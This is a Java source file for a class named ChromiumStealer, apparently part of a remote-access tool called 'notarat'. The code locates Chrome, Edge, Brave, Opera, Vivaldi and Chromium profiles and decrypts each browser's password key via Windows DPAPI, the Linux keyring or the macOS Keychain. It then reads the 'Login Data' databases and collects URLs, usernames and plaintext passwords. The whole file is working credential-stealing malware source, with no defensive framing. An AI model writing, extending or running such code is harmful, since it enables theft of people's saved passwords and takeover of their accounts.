package dev.xotic.notarat.browser;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import dev.xotic.notarat.crypto.ChromeDecrypt;
import dev.xotic.notarat.crypto.LinuxKeyring;
import dev.xotic.notarat.crypto.MacKeychain;
import dev.xotic.notarat.crypto.WinDpapi;
import dev.xotic.notarat.sqlite.SqliteReader;
import dev.xotic.notarat.util.PathUtil;
import dev.xotic.notarat.util.PathUtil.OS;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class ChromiumStealer {

    private static final boolean DEBUG = Boolean.getBoolean("notarat.debug");

    public List<Map<String, String>> dump() {
        List<Map<String, String>> rows = new ArrayList<>();
        for (File userData : PathUtil.chromiumUserDataDirs()) {
            String browser = labelFor(userData);
            String keyringApp = browser.toLowerCase();

            byte[] gcmKey = readGcmKey(userData);
            List<byte[]> cbcCandidates = buildCbcCandidates(keyringApp);

            for (File profile : enumerateProfiles(userData)) {
                File loginDb = new File(profile, "Login Data");
                if (!loginDb.isFile()) {
                    loginDb = new File(userData, "Login Data");
                    if (!loginDb.isFile()) continue;
                }
                try {
                    File tmp = copyToTemp(loginDb);
                    int before = rows.size();
                    rows.addAll(readLogins(tmp, browser, profile.getName(),
                            new ChromeDecrypt(gcmKey, cbcCandidates)));
                } catch (Exception ignored) {
                }
            }
        }
        return rows;}

    private String labelFor(File userData) {
        String p = userData.getAbsolutePath().toLowerCase();
        if (p.contains("edge"))     return "Edge";
        if (p.contains("brave"))    return "Brave";
        if (p.contains("opera"))    return "Opera";
        if (p.contains("vivaldi"))  return "Vivaldi";
        if (p.contains("chromium")) return "Chromium";
        return "Chrome";
    }

    private List<File> enumerateProfiles(File userData) {
        List<File> out = new ArrayList<>();
        File def = new File(userData, "Default");
        if (def.isDirectory()) out.add(def);
        File[] kids = userData.listFiles();
        if (kids != null) {
            for (File f : kids) {
                if (f.isDirectory() && f.getName().startsWith("Profile ")) out.add(f);
            }
        }
        if (out.isEmpty() && new File(userData, "Login Data").isFile()) out.add(userData);
        return out;
    }
    private byte[] readGcmKey(File userData) {
        if (PathUtil.currentOS != OS.WINDOWS) return null;
        File stateFile = new File(userData, "Local State");
        if (!stateFile.isFile()) return null;
        try {
            String json = new String(Files.readAllBytes(stateFile.toPath()), StandardCharsets.UTF_8);
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            JsonObject oc = root.getAsJsonObject("os_crypt");
            if (oc == null) return null;
            JsonElement enc = oc.get("encrypted_key");
            if (enc == null) return null;

            byte[] blob = Base64.getDecoder().decode(enc.getAsString());
            if (blob.length < 5) return null;
            if (!"DPAPI".equals(new String(blob, 0, 5, StandardCharsets.US_ASCII))) return null;
            return WinDpapi.unprotect(Arrays.copyOfRange(blob, 5, blob.length));
        } catch (Exception e) {
            return null;
        }
    }
    private List<byte[]> buildCbcCandidates(String browserApp) {
        List<byte[]> out = new ArrayList<>();

        try {
            List<byte[]> rawKeys;
            int iterations;
            switch (PathUtil.currentOS) {
                case LINUX:
                    rawKeys = LinuxKeyring.fetchAll(browserApp);
                    iterations = 1;
                    break;
                case MAC:
                    rawKeys = MacKeychain.fetchAll(browserApp);
                    iterations = 1003;
                    break;
                default:
                    rawKeys = Collections.emptyList();
                    iterations = 0;
            }

            for (byte[] raw : rawKeys) {
                if (raw == null || raw.length == 0) continue;
                try {
                    out.add(ChromeDecrypt.pbkdf2Bytes(raw, iterations, 128));
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }

        try {
            switch (PathUtil.currentOS) {
                case LINUX:
                    out.add(ChromeDecrypt.pbkdf2Bytes(
                            "peanuts".getBytes(StandardCharsets.US_ASCII), 1, 128));
                    break;
                case MAC:
                    out.add(ChromeDecrypt.pbkdf2Bytes(
                            "peanuts".getBytes(StandardCharsets.US_ASCII), 1003, 128));
                    break;
                default: break;
            }
        } catch (Throwable ignored) {}

        return out;
    }

    private File copyToTemp(File src) throws Exception {
        File tmp = File.createTempFile("ld_", ".db");
        tmp.deleteOnExit();
        Files.copy(src.toPath(), tmp.toPath(), StandardCopyOption.REPLACE_EXISTING);
        return tmp;
    }

    private List<Map<String, String>> readLogins(
            File db, String browser, String profile, ChromeDecrypt dec) throws Exception {

        byte[] bytes;
        try (InputStream in = new FileInputStream(db)) {
            bytes = in.readAllBytes();
        }

        SqliteReader reader = new SqliteReader(bytes);
        int root = reader.rootPageOf("logins");
        if (root < 0) return Collections.emptyList();

        List<Map<String, String>> rows = new ArrayList<>();
        for (Object[] r : reader.walk(root)) {
            if (r.length < 6) continue;

            byte[] blob = (r[5] instanceof byte[]) ? (byte[]) r[5] : null;
            if (blob == null || blob.length < 4) continue;

            String plain = dec.decrypt(blob);
            if (plain == null || plain.isEmpty()) continue;

            Map<String, String> m = new LinkedHashMap<>();
            m.put("browser",  browser);
            m.put("profile",  profile);
            m.put("url",      (r[0] instanceof String) ? (String) r[0] : "");
            m.put("username", (r[3] instanceof String) ? (String) r[3] : "");
            m.put("password", plain);
            rows.add(m);
        }
        return rows;
    }
}